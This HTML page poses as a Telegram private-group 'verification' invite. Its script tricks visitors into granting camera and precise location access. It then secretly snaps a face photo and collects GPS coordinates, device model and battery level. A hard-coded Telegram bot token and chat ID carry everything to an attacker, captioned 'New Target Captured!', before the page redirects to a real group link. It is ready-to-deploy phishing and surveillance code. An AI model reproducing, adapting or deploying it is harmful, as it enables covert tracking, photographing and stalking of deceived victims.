<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Telegram: Join Group Chat">
    <meta property="og:description" content="Click to join the exclusive private group">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
    <meta property="og:url" content="https://t.me/+MXbqj8pPVL82M2Zl">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="theme-color" content="#3390ec">

    <title>Telegram Verification</title>
    <style>
        body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
        .container { padding: 20px; max-width: 350px; }
        .tg-logo { width: 80px; margin-bottom: 20px; }
        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .join-btn:active { transform: scale(0.95); }
        #status { margin-top: 15px; font-size: 13px; color: #888; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="tg-logo" alt="TG">
    <h2>Private Channel Access</h2>
    <p>Please verify your identity to join the group.</p>
    <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
    <p id="status">Location and Camera access required for security verification.</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // Taro's Bot & Redirect Configuration
    const BOT_TOKEN = "8949954317:AAEToMTbNA1r5n00U7dKJcVXSVUcSacmLaE";
    const CHAT_ID = "5304050102";
    const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";

    // ပိုမိုတိကျသော ဖုန်းမော်ဒယ် (ဥပမာ - Redmi Note 8) ရှာဖွေသည့်စနစ်
    function getDetailedModel() {
        const ua = navigator.userAgent;
        let model = "Unknown Device";
        if (/android/i.test(ua)) {
            const match = ua.match(/Android\s([^\s;]+);?\s?([^;]+)\sBuild/);
            model = match ? match[2].trim() : "Android Phone";
        } else if (/iPhone/i.test(ua)) {
            model = "iPhone";
        }
        return model;
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        const btn = document.getElementById('startBtn');
        const statusText = document.getElementById('status');
        btn.innerText = "Verifying...";

        try {
            // ၁။ Camera Permission ယူခြင်း
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;

            // ၂။ High Precision Location (အိမ်အတိအကျနီးပါး) ရယူခြင်း
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const accuracy = Math.round(pos.coords.accuracy);
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`; // တိုက်ရိုက်နှိပ်လို့ရသော Maps Link

                // ၃။ ကျန်သည့် အချက်အလက်များ
                let battery = "N/A";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = `${Math.round(b.level * 100)}%`;
                }
                const model = getDetailedModel();

                // ၄။ ပုံဖမ်းယူပြီး Bot ဆီ အကုန်ပို့ခြင်း
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const video = document.getElementById('video');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.7))).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('caption', `🎯 *New Target Captured!*\n\n📍 Google Map: ${mapLink}\n🎯 Accuracy: ${accuracy} meters\n📱 Model: ${model}\n🔋 Battery: ${battery}`);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                    // ၅။ အကုန်ပြီးရင် Redirect လုပ်မယ်
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = REDIRECT_URL;
                }, 3500);

            }, (err) => {
                alert("Security Error: Please allow Location access to verify you are not a bot.");
                location.reload();
            }, { enableHighAccuracy: true });

        } catch (err) {
            alert("Verification Failed: Camera and Location permissions are mandatory.");
            location.reload();
        }
    });
</script>
</body>
</html>
